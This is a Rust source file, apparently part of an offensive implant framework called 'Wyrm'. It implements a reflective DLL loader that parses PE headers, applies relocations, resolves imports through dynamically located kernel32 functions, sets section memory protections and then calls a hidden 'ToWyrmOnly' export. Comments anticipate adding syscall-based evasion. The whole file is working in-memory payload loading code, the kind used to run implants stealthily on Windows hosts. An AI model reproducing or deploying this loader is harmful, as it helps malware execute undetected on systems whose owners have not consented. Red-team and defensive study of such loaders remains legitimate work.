//! Reflective DLL injector for Wyrm.
//!
//! This assumes that the DLL is loaded into memory by a wrapper around us which has its own base
//! address.
//!
//! This module should be FULLY NO_STD.

use core::{
    ffi::{CStr, c_void},
    mem::transmute,
    ptr::{null_mut, read_unaligned, write_unaligned},
};

use windows_sys::{
    Win32::{
        Foundation::{FARPROC, HANDLE, HMODULE},
        System::{
            Diagnostics::Debug::{
                IMAGE_DATA_DIRECTORY, IMAGE_DIRECTORY_ENTRY_BASERELOC,
                IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_NT_HEADERS64,
                IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE,
                IMAGE_SECTION_HEADER,
            },
            Memory::{
                PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_NOACCESS,
                PAGE_PROTECTION_FLAGS, PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOPY,
                VIRTUAL_ALLOCATION_TYPE,
            },
            SystemServices::{
                IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY,
                IMAGE_IMPORT_DESCRIPTOR, IMAGE_ORDINAL_FLAG64, IMAGE_REL_BASED_DIR64,
                IMAGE_REL_BASED_HIGHLOW,
            },
            WindowsProgramming::IMAGE_THUNK_DATA64,
        },
    },
    core::PCSTR,
};

use crate::utils::export_resolver;

//
// FFI definitions for functions we require for the RDI to work; note these do NOT use evasion techniques such as
// direct/indirect syscalls or any other magic (for now, maybe they will be locked features).
//
type VirtualAlloc = unsafe extern "system" fn(
    *const core::ffi::c_void,
    usize,
    VIRTUAL_ALLOCATION_TYPE,
    PAGE_PROTECTION_FLAGS,
) -> *mut c_void;

type LoadLibraryA = unsafe extern "system" fn(PCSTR) -> HMODULE;

type VirtualProtect = unsafe extern "system" fn(
    *const core::ffi::c_void,
    usize,
    PAGE_PROTECTION_FLAGS,
    *mut PAGE_PROTECTION_FLAGS,
) -> windows_sys::core::BOOL;

type GetProcAddress = unsafe extern "system" fn(HMODULE, PCSTR) -> FARPROC;

type FlushInstructionCache =
    unsafe extern "system" fn(HANDLE, *mut c_void, usize) -> windows_sys::core::BOOL;

type GetCurrentProcess = unsafe extern "system" fn() -> HANDLE;

/// Function pointers for the Reflective DLL Injector to use.
#[allow(non_snake_case)]
struct RdiExports {
    LoadLibraryA: LoadLibraryA,
    VirtualAlloc: VirtualAlloc,
    VirtualProtect: VirtualProtect,
    GetProcAddresS: GetProcAddress,
    FlushInstructionCache: FlushInstructionCache,
    GetCurrentProcess: GetCurrentProcess,
}

impl RdiExports {
    /// Construct a new [`RdiExports`] by resolving the address of the respective functions in their DLL. Note that these
    /// DLLs either must already be loaded, or the [`RdiExports::new`] function needs to be amended to load those DLLs in
    /// via LoadLibrary or other mechanism to be successful.
    ///
    /// If the function fails to resolve all functions, it will return `None`
    fn new() -> Option<Self> {
        //
        // Resolve the function addresses from the respective DLL's, note these should be loaded in the process or this
        // will fail
        //
        let lla = export_resolver::resolve_address("kernel32.dll", "LoadLibraryA", None)
            .unwrap_or_default();

        let virtual_alloc = export_resolver::resolve_address("kernel32.dll", "VirtualAlloc", None)
            .unwrap_or_default();

        let vp = export_resolver::resolve_address("kernel32.dll", "VirtualProtect", None)
            .unwrap_or_default();

        let gpa = export_resolver::resolve_address("kernel32.dll", "GetProcAddress", None)
            .unwrap_or_default();

        let fic = export_resolver::resolve_address("kernel32.dll", "FlushInstructionCache", None)
            .unwrap_or_default();

        let curproc = export_resolver::resolve_address("kernel32.dll", "GetCurrentProcess", None)
            .unwrap_or_default();

        //
        // Validate everything was resolved correctly
        //
        if lla.is_null()
            || virtual_alloc.is_null()
            || vp.is_null()
            || gpa.is_null()
            || fic.is_null()
            || curproc.is_null()
        {
            return None;
        }

        unsafe {
            //
            // Cast as fn ptrs correctly
            //
            let lla = transmute::<_, LoadLibraryA>(lla);
            let virtual_alloc = transmute::<_, VirtualAlloc>(virtual_alloc);
            let vp = transmute::<_, VirtualProtect>(vp);
            let gpa = transmute::<_, GetProcAddress>(gpa);
            let fic = transmute::<_, FlushInstructionCache>(fic);
            let curproc = transmute::<_, GetCurrentProcess>(curproc);

            Some(Self {
                LoadLibraryA: lla,
                VirtualAlloc: virtual_alloc,
                VirtualProtect: vp,
                GetProcAddresS: gpa,
                FlushInstructionCache: fic,
                GetCurrentProcess: curproc,
            })
        }
    }
}

#[repr(u32)]
enum RdiErrorCodes {
    Success = 0,
    CouldNotParseExports,
    RelocationsNull,
    MalformedVirtualAddress,
    ImportDescriptorNull,
}

/// The entrypoint for the reflective DLL loading. We must take in the base address of our module that
/// we wish to do work on. Any loader must call our Load export with the allocation base address.
#[unsafe(no_mangle)]
pub unsafe extern "system" fn Load(image_base: *mut c_void) -> u32 {
    //
    // Resolve function pointers for Windows API fns we need in the RDI
    //
    let Some(exports) = RdiExports::new() else {
        // We could not resolve all the required function pointers
        return RdiErrorCodes::CouldNotParseExports as _;
    };

    //
    // Parse the headers
    //
    let dos_header = unsafe { *(image_base as *const IMAGE_DOS_HEADER) };
    let nt_offset = dos_header.e_lfanew as usize;
    let p_nt_headers = (image_base as usize + nt_offset) as *mut IMAGE_NT_HEADERS64;

    //
    // process image relocations
    //
    let data_dir = unsafe { *p_nt_headers }.OptionalHeader.DataDirectory;

    let relocations_ptr = ((image_base as usize)
        + data_dir[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].VirtualAddress as usize)
        as *mut IMAGE_BASE_RELOCATION;

    if relocations_ptr.is_null() {
        return RdiErrorCodes::RelocationsNull as _;
    }

    process_relocations(image_base, p_nt_headers, &data_dir);

    //
    // Resolve imports from IAT
    //
    if data_dir[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress == 0 {
        return RdiErrorCodes::MalformedVirtualAddress as _;
    }

    let import_descriptor_ptr: *mut IMAGE_IMPORT_DESCRIPTOR = get_addr_as_rva(
        image_base as _,
        data_dir[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress as usize,
    );
    if import_descriptor_ptr.is_null() {
        return RdiErrorCodes::ImportDescriptorNull as _;
    }

    //
    // Resolve the import address table
    //
    patch_iat(image_base, import_descriptor_ptr, &exports);

    relocate_and_commit(image_base, p_nt_headers, &exports);

    //
    // Finally, the the real entrypoint
    //
    if let Some(exp) = find_export(image_base, p_nt_headers, "ToWyrmOnly") {
        unsafe {
            exp();
        }
    }

    RdiErrorCodes::Success as _
}

/// Finds an export for a DLL in memory at the base, given an input name.
///
/// On success returns a function pointer to the function.
fn find_export(
    base: *mut c_void,
    nt: *mut IMAGE_NT_HEADERS64,
    name: &str,
) -> Option<unsafe extern "system" fn()> {
    unsafe {
        let dir = (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize];
        if dir.VirtualAddress == 0 || dir.Size == 0 {
            return None;
        }

        let exp_dir: *mut IMAGE_EXPORT_DIRECTORY =
            get_addr_as_rva(base as _, dir.VirtualAddress as usize);

        if exp_dir.is_null() {
            return None;
        }

        let exp = *exp_dir;

        let names: *const u32 = get_addr_as_rva(base as _, exp.AddressOfNames as usize);
        let funcs: *const u32 = get_addr_as_rva(base as _, exp.AddressOfFunctions as usize);
        let ords: *const u16 = get_addr_as_rva(base as _, exp.AddressOfNameOrdinals as usize);

        //
        // Iterate over the exported names searching for the exported function
        //
        for i in 0..exp.NumberOfNames {
            let name_rva = read_unaligned(names.add(i as usize)) as usize;
            let name_ptr = get_addr_as_rva::<u8>(base as _, name_rva);
            let export_name = CStr::from_ptr(name_ptr as _).to_str().ok();
            if export_name == Some(name) {
                let ord_index = read_unaligned(ords.add(i as usize)) as usize;
                let func_rva = read_unaligned(funcs.add(ord_index)) as usize;
                let func_ptr = get_addr_as_rva::<u8>(base as _, func_rva) as usize;
                return Some(transmute::<usize, unsafe extern "system" fn()>(func_ptr));
            }
        }

        // Did not find exported function
        None
    }
}

fn relocate_and_commit(
    p_base: *mut c_void,
    p_nt_headers: *mut IMAGE_NT_HEADERS64,
    exports: &RdiExports,
) {
    unsafe {
        // RVA of the first IMAGE_SECTION_HEADER in the PE file
        let section_header_ptr = get_addr_as_rva::<IMAGE_SECTION_HEADER>(
            &(*p_nt_headers).OptionalHeader as *const _ as _,
            (*p_nt_headers).FileHeader.SizeOfOptionalHeader as usize,
        );

        //
        // Loop through each section in the PE (.text, .rdata etc) and set the expected protections
        //
        for i in 0..(*p_nt_headers).FileHeader.NumberOfSections {
            let mut protect = 0;
            let mut old_protect = 0;

            let p_section_header = &*(section_header_ptr).add(i as _);
            // A pointer to where it is actually loaded (base + RVA)
            let p_target = p_base
                .cast::<u8>()
                .add(p_section_header.VirtualAddress as usize);
            let section_raw_size = p_section_header.SizeOfRawData as usize;

            //
            // Now apply the relevant flags depending upon the intention
            //
            let is_x = p_section_header.Characteristics & IMAGE_SCN_MEM_EXECUTE != 0;
            let is_r = p_section_header.Characteristics & IMAGE_SCN_MEM_READ != 0;
            let is_w = p_section_header.Characteristics & IMAGE_SCN_MEM_WRITE != 0;

            if !is_x && !is_r && !is_w {
                protect = PAGE_NOACCESS;
            }

            if is_w {
                protect = PAGE_WRITECOPY;
            }

            if is_r {
                protect = PAGE_READONLY;
            }

            if is_w && is_r {
                protect = PAGE_READWRITE;
            }

            if is_x {
                protect = PAGE_EXECUTE;
            }

            if is_x && is_r {
                protect = PAGE_EXECUTE_READ;
            }

            if is_x && is_w && is_r {
                protect = PAGE_EXECUTE_READWRITE;
            }

            // Change the protection
            (exports.VirtualProtect)(
                p_target as *const _,
                section_raw_size,
                protect,
                &mut old_protect,
            );
        }

        // Flush to prevent stale instruction cache
        (exports.FlushInstructionCache)((exports.GetCurrentProcess)(), null_mut(), 0);
    }
}

fn process_relocations(
    p_image_base: *mut c_void,
    p_nt_headers: *mut IMAGE_NT_HEADERS64,
    data_dir: &[IMAGE_DATA_DIRECTORY; 16],
) {
    unsafe {
        // Calculate the diff between where the DLL actually loaded vs where it was compiled to load
        let load_diff = p_image_base as isize - (*p_nt_headers).OptionalHeader.ImageBase as isize;

        let reloc_rva = data_dir[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].VirtualAddress as usize;
        let reloc_size = data_dir[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].Size as usize;

        // Calculate the actual addresses for the start and end of the relocation table
        let reloc_start = (p_image_base as usize + reloc_rva) as usize;
        let reloc_end = reloc_start + reloc_size;

        let mut p_img_base_relocation = reloc_start as *mut IMAGE_BASE_RELOCATION;

        //
        // iterate through each IMAGE_BASE_RELOCATION block in the relocation table
        //
        while (p_img_base_relocation as usize) < reloc_end
            && (*p_img_base_relocation).SizeOfBlock as usize >= size_of::<IMAGE_BASE_RELOCATION>()
            && (*p_img_base_relocation).VirtualAddress != 0
        {
            // First relocation item
            let item = (p_img_base_relocation as *mut u8).add(size_of::<IMAGE_BASE_RELOCATION>())
                as *const u16;
            // How many relocations to process
            let num_relocations = ((*p_img_base_relocation).SizeOfBlock as usize
                - size_of::<IMAGE_BASE_RELOCATION>())
                / size_of::<u16>();

            //
            // Process each relocation table
            //
            for i in 0..num_relocations {
                // read the entry (16 bits)
                let entry = read_unaligned(item.add(i));
                // Extract the type
                let type_field = (entry >> 12) as u32;
                let roff = (entry & 0x0FFF) as usize;

                // Calculate teh absolute address of the value that needs to be relocated
                // base + page RVA + offset within page
                let patch_addr = (p_image_base as usize
                    + (*p_img_base_relocation).VirtualAddress as usize
                    + roff) as *mut u8;

                //
                // Apply the actual relocation
                //
                match type_field {
                    IMAGE_REL_BASED_DIR64 => {
                        let p = patch_addr as *mut u64;
                        let v = read_unaligned(p);
                        write_unaligned(p, (v as i64 + load_diff as i64) as u64);
                    }
                    IMAGE_REL_BASED_HIGHLOW => {
                        let p = patch_addr as *mut u32;
                        let v = read_unaligned(p);
                        write_unaligned(p, (v as i32 + load_diff as i32) as u32);
                    }
                    _ => {}
                }
            }

            // Move to the next reloc block
            p_img_base_relocation = get_addr_as_rva(
                p_img_base_relocation as _,
                (*p_img_base_relocation).SizeOfBlock as usize,
            );
        }
    }
}

fn patch_iat(
    base_addr_ptr: *mut c_void,
    mut import_descriptor_ptr: *mut IMAGE_IMPORT_DESCRIPTOR,
    exports: &RdiExports,
) -> bool {
    unsafe {
        loop {
            let desc = read_unaligned(import_descriptor_ptr);
            if desc.Name == 0 {
                break;
            }

            let module_name_ptr = get_addr_as_rva::<i8>(base_addr_ptr as _, desc.Name as usize);
            if module_name_ptr.is_null() {
                return false;
            }

            let module_handle = (exports.LoadLibraryA)(module_name_ptr as _);
            if module_handle.is_null() {
                return false;
            }

            let oft = desc.Anonymous.OriginalFirstThunk as usize;
            let mut orig_thunk: *mut IMAGE_THUNK_DATA64 = if oft != 0 {
                get_addr_as_rva(base_addr_ptr as _, oft)
            } else {
                get_addr_as_rva(base_addr_ptr as _, desc.FirstThunk as usize)
            };

            let mut thunk: *mut IMAGE_THUNK_DATA64 =
                get_addr_as_rva(base_addr_ptr as _, desc.FirstThunk as usize);

            loop {
                let ot = read_unaligned(orig_thunk);
                if ot.u1.Function == 0 {
                    break;
                }

                let func_addr = if (ot.u1.Ordinal & IMAGE_ORDINAL_FLAG64) != 0 {
                    //
                    // import by ordinal
                    //
                    let ord = (ot.u1.Ordinal & 0xFFFF) as *const u8;
                    match (exports.GetProcAddresS)(module_handle as _, ord as _) {
                        Some(f) => f as u64,
                        None => return false,
                    }
                } else {
                    //
                    // imports by name
                    //
                    let name_rva = ot.u1.AddressOfData as usize;
                    let name_ptr = get_addr_as_rva::<u8>(base_addr_ptr as _, name_rva).add(2);
                    match (exports.GetProcAddresS)(module_handle as _, name_ptr as _) {
                        Some(f) => f as u64,
                        None => return false,
                    }
                };

                let mut t = read_unaligned(thunk);
                t.u1.Function = func_addr;
                write_unaligned(thunk, t);

                orig_thunk = orig_thunk.add(1);
                thunk = thunk.add(1);
            }

            import_descriptor_ptr = import_descriptor_ptr.add(1);
        }
    }
    true
}

fn get_addr_as_rva<T>(base_ptr: *mut u8, offset: usize) -> *mut T {
    (base_ptr as usize + offset) as *mut T
}
